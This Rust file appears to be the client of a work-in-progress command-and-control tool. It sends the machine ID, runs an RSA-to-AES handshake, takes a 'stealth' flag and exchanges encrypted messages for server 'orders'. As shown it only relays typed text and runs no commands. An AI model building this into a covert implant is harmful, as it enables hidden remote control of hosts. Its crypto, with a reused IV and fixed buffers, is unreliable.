mod connexion;

mod function_utils;
mod scenario;

use std::borrow::Borrow;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::thread;
use std::str;
use std::error::Error;
// use object::Error;
use String;
use std::sync::mpsc;
//use std::sync::mpsc::channel;

use openssl::encrypt::{Encrypter, Decrypter};
use openssl::rsa::{Rsa, Padding};
use openssl::pkey::PKey;

// use rsa::{RsaPublicKey, RsaPrivateKey, PublicKeyPemEncoding};
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};
// use rsa::pkcs1::{EncodeRsaPublicKey, LineEnding};
use rsa::pkcs1::{EncodeRsaPublicKey, EncodeRsaPrivateKey, LineEnding};
use rsa::pkcs8::{EncodePublicKey};

use rand::rngs::OsRng;
use rsa_export::PemEncode;
// use rsa::pkcs1::EncodeRsaPublicKey;
use serde_json;


use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use hex_literal::hex;
use std::any::type_name;
use serde::{Deserialize, Serialize};

use generic_array::GenericArray;

use base64::{Engine as _, alphabet, engine::{self, general_purpose}};

use machine_uid::get;


type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

// JSON config handshake

#[derive(Serialize, Deserialize)]
struct HandshakeConfJson{
    action: String,
    b64symetric: String,
    b64iv: String,
    multithread: bool,
    stealth: bool
}




fn json_to_struct_handshake_stc(data: String) -> HandshakeConfJson {
    let p = serde_json::from_str::<HandshakeConfJson>(&data).expect("Erreur JSON");
    p
}

fn struct_to_json_handshake_stc(data:HandshakeConfJson) -> String{
    let json_string = serde_json::to_string(&data);
    json_string.unwrap()
}

fn print_type_of<T>(_: &T) {
    println!("{}", std::any::type_name::<T>())
}


fn send_encrypted_data_to_server(sender:mpsc::Sender<Vec<u8>>,
                       data:String,
                       symetric_key:GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
                       iv:GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>){

    let data_as_bytes = data.as_bytes().to_vec();
    let mut bufff = [0u8; 94];
    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&data_as_bytes, &mut bufff)
        .unwrap();

    match sender.send(encrypted_data.to_vec()) {
        Ok(()) => {
            println!("Data sent successfully!");
        }
        Err(err) => {
            eprintln!("Error sending data: {}", err);
            // Handle the error more gracefully
        }
    }
}



fn receive_encrypted_data_from_server(receiver:&mpsc::Receiver<Vec<u8>>,
    symetric_key:GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv:GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>)
    -> String{
    match receiver.recv() {
        Ok(data) => {
            println!("Data received successfully!");

            println!("Data received : {:?}", data);

            let mut bufff = [0u8; 94];
            let decrypted_data = Aes128CbcDec::new(&symetric_key, &iv)
                .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut bufff)
                .unwrap_or_default();

            match str::from_utf8(&decrypted_data) {
                Ok(utf8_data) => utf8_data.to_string(),
                Err(err) => {
                    eprintln!("Error converting data to UTF-8: {:?}", err);
                    // Handle the error more gracefully, return a default string for now
                    String::new()
                }
            }
        }
        Err(err) => {
            eprintln!("Error while receiving data: {:?}", err);
            // Handle the error more gracefully, return a default string for now
            String::new()
        }
    }

}


fn main() -> io::Result<()> {

    // Connexion
    let connexion:TcpStream = connexion::connexion()?;
    let connexion2:TcpStream = connexion.try_clone()?;

    // thread emission
    let (sender, rx) = mpsc::channel::<Vec<u8>>();
    let thread_emission = thread::spawn(move|| {
        connexion::emission(connexion, rx);
    });

    // thread reception
    let (tx2, receiver) = mpsc::channel::<Vec<u8>>();
    let thread_reception = thread::spawn(move|| {
        connexion::reception(connexion2, tx2);
    });


    // ========== HANDSHAKE ==========

    let mut rng = OsRng;
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);

    let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();
    let pkcs1_encoded_private_pem = private_key.to_pkcs1_pem(LineEnding::LF).unwrap();

    // println!("Public Key as Vec<u8>: {:?}", pkcs1_encoded_public_pem);
    // println!("Private Key as Vec<u8>: {:?}", pkcs1_encoded_private_pem);

    // sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();


    // let encrypted_data = receiver.recv().unwrap();

    // println!("Decrypted data: {:?}", str::from_utf8(&dec_data).unwrap());

    // return Ok(());
    //===========================================================


    // Generate a keypair
    // let rsa = Rsa::generate(2048).unwrap();
    // let keypair = PKey::from_rsa(rsa).unwrap();

    // let pub_key_pem: Vec<u8> = keypair.public_key_to_pem().unwrap();
    // println!("Clé publique générée : {:?}", str::from_utf8(pub_key_pem.as_slice()).unwrap());

    // Envois de la clé publique au serveur python
    sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();

    // Réception de la clé symétrique chiffrée
    let mut encrypted_hanshake_data = receiver.recv().unwrap();

    // Déchiffrement de la clé symétrique
    let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_hanshake_data).unwrap();

    let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());

    let stealth_mode = handshake_data.stealth;
    let multithread_mode = handshake_data.multithread;

    // Decode the base64 key
    let symetric_key;
    match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()){
        Ok(decoded_sym_key) => {
            // Successfully decoded, assign the value to iv
            symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
        }
        Err(err) => {
            eprintln!("Error decoding base64 symetric key: {}", err);
            // Handle the error, for now, let's assign an empty Vec<u8>
            symetric_key = GenericArray::default();
        }
    };

    // Decode the base64 iv
    let iv;
    match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()){
        Ok(decoded_iv) => {
            // Successfully decoded, assign the value to iv
            iv = GenericArray::clone_from_slice(&decoded_iv);
        }
        Err(err) => {
            eprintln!("Error decoding base64 iv: {}", err);
            // Handle the error, for now, let's assign an empty Vec<u8>
            iv = GenericArray::default();
        }
    };


    let uid = machine_uid::get().unwrap();

    let handshake_response:String = format!("{{\"action\":\"client_config\",\"uid\":\"{}\"}}", uid);

    send_encrypted_data_to_server(sender.clone(), handshake_response, symetric_key, iv);

    let thread_test = thread::spawn(move|| {
        loop {
            // println!("Message Recu : {}", std::str::from_utf8(receive_encrypted_data_from_server(receiver.borrow(), symetric_key, iv)).unwrap());
            // match receive_encrypted_data_from_server(receiver.borrow(), symetric_key, iv){
            //     Ok(data) => {
            //         if let Ok(utf8_data) = std::str::from_utf8(&data) {
            //             println!("Message Recu : {}", utf8_data);
            //         } else {
            //             eprintln!("Error converting data to UTF-8");
            //         }
            //     }
            // }
            println!("Message Recu : {}", receive_encrypted_data_from_server(receiver.borrow(), symetric_key, iv));
        }
    });

    loop {
        // Réception des ordres du serveur
        let mut input = String::new();
        println!("Entrez un message : ");

        match io::stdin().read_line(&mut input) {
            Ok(n) => {
                println!("{}", input);

                send_encrypted_data_to_server(sender.clone(), input, symetric_key, iv);
            }
            Err(error) => println!("error: {error}"),
        }
        // println!("Message Recu : {}", receive_encrypted_data_from_server(receiver.borrow(), symetric_key, iv));

    }
    return Ok(());
    // loop{

    //     let encrypted_data:Vec<u8>;

    //     match receiver.recv() {
    //         Ok(received_data) => {
    //             println!("Data received successfully!");
    //             encrypted_data = received_data;
    //         }
    //         Err(err) => {
    //             eprintln!("Error receiving data: {}", err);
    //             // Handle the error more gracefully
    //             encrypted_data = vec![];
    //         }
    //     }


    //     let mut buf = [0u8; 48];
    //     let data = Aes128CbcDec::new(&symetric_key, &iv)
    //         .decrypt_padded_b2b_mut::<Pkcs7>(&encrypted_data, &mut buf)
    //         .unwrap();

    //     println!(">> data received from python : {}", str::from_utf8(&data).unwrap());


    //     let mut msg = str::from_utf8(&data).unwrap();

    //     let rsp = format!("{}{}", msg, " - OK");


    //     let data_to_send = rsp.as_bytes().to_vec();
    //     let mut buf = [0u8; 48];
    //     let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
    //         .encrypt_padded_b2b_mut::<Pkcs7>(&data_to_send, &mut buf)
    //         .unwrap();

    //     match sender.send(encrypted_data.to_vec()) {
    //         Ok(()) => {
    //             println!("Data sent successfully!");
    //         }
    //         Err(err) => {
    //             eprintln!("Error sending data: {}", err);
    //             // Handle the error more gracefully
    //         }
    //     }
    // }




    // let michel = "michel".as_bytes().to_vec();
    // let mut buf = [0u8; 48];
    // let ciphered_michel = Aes128CbcEnc::new(&symetric_key, &iv)
    //     .encrypt_padded_b2b_mut::<Pkcs7>(&michel, &mut buf)
    //     .unwrap();

    // println!("sending encrypted michel : {:?}", ciphered_michel);

    // match sender.send(ciphered_michel.to_vec()) {
    //     Ok(()) => {
    //         println!("Data sent successfully!");
    //     }
    //     Err(err) => {
    //         eprintln!("Error sending data: {}", err);
    //         // Handle the error more gracefully
    //     }
    // }


    // let encrypted_michel:Vec<u8>;

    // match receiver.recv() {
    //     Ok(received_data) => {
    //         println!("Data received successfully!");
    //         encrypted_michel = received_data;
    //     }
    //     Err(err) => {
    //         eprintln!("Error receiving data: {}", err);
    //         // Handle the error more gracefully
    //         encrypted_michel = vec![];
    //     }
    // }

    // let mut buf = [0u8; 48];
    // let pt = Aes128CbcDec::new(&symetric_key, &iv)
    //     .decrypt_padded_b2b_mut::<Pkcs7>(&encrypted_michel, &mut buf)
    //     .unwrap();

    // println!("michel : {}", str::from_utf8(&pt).unwrap());



    // // arrêt du programme


    // thread_reception.join().expect("Thread reception erreur");
    // thread_emission.join().expect("Thread emission erreur");

    // //switch case

    // println!("action : {}", handshake_data.action);
    // println!("b64symetric : {}", handshake_data.b64symetric);
    // println!("b64iv : {}", handshake_data.b64iv);
    // println!("multithread : {}", handshake_data.multithread);
    // println!("stealth : {}", handshake_data.stealth);



    // Ok(())

}